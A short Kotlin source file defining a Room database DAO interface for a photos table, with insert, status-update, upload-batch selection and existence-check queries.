package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.Photos
import com.android.services.util.AppConstants

@Dao
interface PhotosDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(photosList: List<Photos>)

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(Photos: Photos)

    @Query("update photos_table set status = :updated_status where photo_id=:id")
    fun update(updated_status: Int, id: String): Int

    @Query("Select * from photos_table where status = :status order by date DESC limit ${AppConstants.mediaFilesUploadLimit}")
    fun selectAllImages(status: Int): List<Photos>

    @Query("Select photo_id from photos_table where photo_id = :Image_id")
    fun checkIfAlreadyExist(Image_id: String): String?
}